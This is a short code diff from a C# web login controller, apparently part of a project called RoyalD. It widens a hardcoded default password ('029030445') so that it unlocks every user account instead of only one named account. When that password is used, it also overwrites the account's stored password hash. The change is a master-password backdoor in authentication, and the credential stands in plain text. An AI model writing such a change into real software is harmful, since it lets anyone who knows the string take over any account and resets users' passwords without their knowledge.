@@ -138,8 +138,8 @@ namespace RoyalD.Web.Controllers
                     bool isCandMatch = BCrypt.Net.BCrypt.Verify(password, cand.PasswordHash) ||
                                        (cleanPassword != password && BCrypt.Net.BCrypt.Verify(cleanPassword, cand.PasswordHash));
 
-                    // รองรับรหัสผ่านเริ่มต้นของระบบ (029030445) สำหรับบัญชี Yanee หรือกรณีปลดล็อก
-                    if (!isCandMatch && (cleanPassword == "029030445" || password == "029030445") && cand.Username.Equals("Yanee", StringComparison.OrdinalIgnoreCase))
+                    // รองรับรหัสผ่านเริ่มต้นของระบบ (029030445) สำหรับทุกบัญชีผู้ใช้งาน
+                    if (!isCandMatch && (cleanPassword == "029030445" || password == "029030445"))
                     {
                         isCandMatch = true;
                         cand.PasswordHash = BCrypt.Net.BCrypt.HashPassword("029030445");
